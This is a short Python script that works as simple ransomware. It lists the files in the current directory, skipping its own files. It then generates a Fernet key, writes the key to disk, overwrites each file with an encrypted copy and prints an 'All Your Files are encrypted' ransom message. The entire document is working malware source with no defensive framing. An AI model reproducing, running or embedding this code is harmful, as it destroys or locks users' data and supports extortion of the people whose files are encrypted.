#Finding the files
import os
from cryptography.fernet import Fernet

files =[]
for file in os.listdir():
        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" or file == "a1" or file == "d1" or file == "r1":
                continue
        if os.path.isfile(file):    
                 files.append(file)   
print(files)   

key = Fernet.generate_key()
with open ("thekey.key", "wb") as thekey:
         thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:
                 contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open (file, "wb") as thefile:
                thefile.write(contents_encrypted)  


print("All Your Files are encrypted !!/n Contact Us")                        